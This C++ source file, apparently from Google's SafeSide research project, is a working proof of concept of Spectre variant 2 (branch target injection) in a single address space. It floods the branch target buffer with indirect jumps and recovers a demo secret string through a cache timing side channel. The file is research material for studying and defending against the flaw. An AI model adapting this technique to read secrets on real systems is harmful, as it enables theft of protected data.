/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Implements Spectre variant 2 (branch target injection), same address space
 * version.
 * Compared to competing approaches we don't bother to reverse-engineer branch
 * predictors. Since we need a universal and robust solution we have to
 * abstract from their peculiarities, so our solution is based on a brute-force
 * approach.
 * We flood the Branch target buffer (BTB) with a plenty of jumps that do not
 * follow typical patterns. In this way we interleave jumps to real readers
 * (FirstActualRead and SecondActualRead) that fetch safe values with jumps to
 * the dummy reader (DummyRead) that does not fetch anything, but gets the
 * unsafe values. That leads to misspeculations (some of the dummy reader
 * jumps are misspeculated somewhere into the real fetcher destinations).
 **/

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

// Recursive templates to repeat code without using .rept and inline assembly.
// Generates NOP instructions (used in DummyRead).
template<unsigned int N> struct Nops {
  SAFESIDE_ALWAYS_INLINE static inline void generate() {
    GenerateNop();
    Nops<N - 1>::generate();
  }
};

template<> struct Nops<0> {
  SAFESIDE_ALWAYS_INLINE static inline void generate() {
    // Empty.
  }
};

// Fetches an address N-times in a real reader (FirstActualRead or
// SecondActualRead).
template<unsigned int N> struct Fetches {
  SAFESIDE_ALWAYS_INLINE static inline void generate(const void *addr) {
    (void)*reinterpret_cast<const volatile char *>(addr);
    Fetches<N - 1>::generate(addr);
  }
};

template<> struct Fetches<0> {
  SAFESIDE_ALWAYS_INLINE static inline void generate(const void *addr) {
    // Empty.
  }
};

// Repeatedly indirectly invokes a real reader on a safe address in
// LeakByte.
template<unsigned int N> struct SafeCalls {
  SAFESIDE_ALWAYS_INLINE static inline void generate(
#if SAFESIDE_X64 || SAFESIDE_ARM64 || SAFESIDE_PPC
     void (*real_reader)(const void *),
#elif SAFESIDE_IA32
     void (SAFESIDE_FASTCALL *real_reader)(const void *),
#else
#  error Unsupported architecture.
#endif
     const void *safe_address) {
    real_reader(safe_address);
    SafeCalls<N - 1>::generate(real_reader, safe_address);
  }
};

template<> struct SafeCalls<0> {
  SAFESIDE_ALWAYS_INLINE static inline void generate(
#if SAFESIDE_X64 || SAFESIDE_ARM64 || SAFESIDE_PPC
     void (*real_reader)(const void *),
#elif SAFESIDE_IA32
     void (SAFESIDE_FASTCALL *real_reader)(const void *),
#else
#  error Unsupported architecture.
#endif
     const void *safe_address) {
    // Empty.
  }
};

// Repeatedly flushes a dummy reader from the cache and invokes it on an
// unsafe address in LeakByte.
template<unsigned int N> struct DummyCalls {
  SAFESIDE_ALWAYS_INLINE static inline void generate(
#if SAFESIDE_X64 || SAFESIDE_ARM64 || SAFESIDE_PPC
     void (**dummy_reader)(const void *),
#elif SAFESIDE_IA32
     void (SAFESIDE_FASTCALL **dummy_reader)(const void *),
#else
#  error Unsupported architecture.
#endif
     const void *unsafe_address) {
    CLFlush(dummy_reader);
    (*dummy_reader)(unsafe_address);
    DummyCalls<N - 1>::generate(dummy_reader, unsafe_address);
  }
};

template<> struct DummyCalls<0> {
  SAFESIDE_ALWAYS_INLINE static inline void generate(
#if SAFESIDE_X64 || SAFESIDE_ARM64 || SAFESIDE_PPC
     void (**dummy_reader)(const void *),
#elif SAFESIDE_IA32
     void (SAFESIDE_FASTCALL **dummy_reader)(const void *),
#else
#  error Unsupported architecture.
#endif
     const void *unsafe_address) {
    // Empty.
  }
};

// We fastcall the readers in the 32-bit mode so that there is only one
// instruction. Otherwise there would be two (fetch the pointer from the stack
// and fetch from the pointer).
void
#if SAFESIDE_IA32
SAFESIDE_FASTCALL
#endif
FirstActualRead(const void *addr) {
  // We read the value 100 times to have enough places to jump to.
  Fetches<100>::generate(addr);
}

// DummyRead is between the two real reads, so that misjump chances are the
// highest possible.
void
#if SAFESIDE_IA32
SAFESIDE_FASTCALL
#endif
DummyRead(const void *addr) {
  // Does nothing - only NOPs.
  Nops<100>::generate();
}

void
#if SAFESIDE_IA32
SAFESIDE_FASTCALL
#endif
SecondActualRead(const void *addr) {
  // Read it one more time to avoid compiler deduplication with jump to the
  // FirstActualRead.
  Fetches<101>::generate(addr);
}

static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  // Pointer to pointer to DummyRead so that we can easily flush it from
  // the cache and start speculative execution.
#if SAFESIDE_X64 || SAFESIDE_ARM64 || SAFESIDE_PPC
  std::unique_ptr<void(*)(const void *)> dummy_reader =
      std::unique_ptr<void(*)(const void *)>(new (void (*)(const void *)));
#elif SAFESIDE_IA32
  std::unique_ptr<void(SAFESIDE_FASTCALL *)(const void *)> dummy_reader =
      std::unique_ptr<void(SAFESIDE_FASTCALL *)(const void *)>(
          new (void (SAFESIDE_FASTCALL *)(const void *)));
#else
#  error Unsupported architecture.
#endif

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    size_t safe_offset = run % strlen(data);

    // We are going to shift these pointers instruction-by-instruction (mov
    // instruction in the case of real readers and nop instruction in the case
    // of the dummy reader), so that we increase the amount of destination
    // addresses;
    char *first_ptr = reinterpret_cast<char *>(FirstActualRead);
    char *second_ptr = reinterpret_cast<char *>(SecondActualRead);
    char *dummy_ptr = reinterpret_cast<char *>(DummyRead);

    for (int i = 0; i < 100; ++i) {
      // Shift real readers to the next mov instruction and dummy reader to the
      // next nop instruction to diversify destination addresses.
#if SAFESIDE_X64 || SAFESIDE_IA32
      // NOP has always one byte on X86/64.
      dummy_ptr += 1;
#  ifdef __clang__
      // Clang uses movb to al as the blind fetch instruction and that has 2
      // bytes.
      first_ptr += 2;
      second_ptr += 2;
#  elif defined(__INTEL_COMPILER) && SAFESIDE_X64
      // ICC generates cycles of length 8. First three are movs that have 2
      // bytes (al, dl, cl), last five are movs that have 3 bytes (sil, r8b,
      // r9b, r10b, r11b). On IA32 it behaves the same way as G++.
      first_ptr += 2 + static_cast<bool>(i % 8 > 2);
      second_ptr += 2 + static_cast<bool>(i % 8 > 2);
#  elif SAFESIDE_GNUC || SAFESIDE_MSVC
      // G++, MSVC and 32-bit ICC use movzbl to eax and that has 3 bytes.
      first_ptr += 3;
      second_ptr += 3;
#  else
#    error Unsupported compiler.
#  endif
#elif SAFESIDE_ARM64 || SAFESIDE_PPC
      // ARM and PowerPC instructions have always 4 bytes.
      dummy_ptr += 4;
      first_ptr += 4;
      second_ptr += 4;
#else
#  error Unsupported architecture.
#endif

#if SAFESIDE_X64 || SAFESIDE_ARM64 || SAFESIDE_PPC
      void (*first_real_reader)(const void *) =
          reinterpret_cast<void (*)(const void *)>(first_ptr);
      void (*second_real_reader)(const void *) =
          reinterpret_cast<void (*)(const void *)>(second_ptr);
      *dummy_reader =
          reinterpret_cast<void (*)(const void *)>(dummy_ptr);
#elif SAFESIDE_IA32
      void (SAFESIDE_FASTCALL *first_real_reader)(const void *) =
          reinterpret_cast<void (SAFESIDE_FASTCALL *)(const void *)>(
              first_ptr);
      void (SAFESIDE_FASTCALL *second_real_reader)(const void *) =
          reinterpret_cast<void (SAFESIDE_FASTCALL *)(const void *)>(
              second_ptr);
      *dummy_reader =
          reinterpret_cast<void (SAFESIDE_FASTCALL *)(const void *)>(
              dummy_ptr);
#else
#  error Unsupported architecture.
#endif

      // Inline 100 jumps to a real read from 100 different source addresses to
      // the dynamic destination address (that has again 100 values).
      SafeCalls<100>::generate(
          second_real_reader, oracle.data() + static_cast<size_t>(
              data[safe_offset]));

      // Inline 100 jumps to the dummy read from 100 different source
      // addresses to the dynamic destination address.
      // Misjumps to actual reads in this section are pure injections, because
      // architecturally those jumps lead always into the dummy reader full of
      // nops.
      DummyCalls<100>::generate(
          dummy_reader.get(), oracle.data() + static_cast<size_t>(
              data[offset]));

      // Another 100 jumps to real reads.
      SafeCalls<100>::generate(
          first_real_reader, oracle.data() + static_cast<size_t>(
              data[safe_offset]));
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cout << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
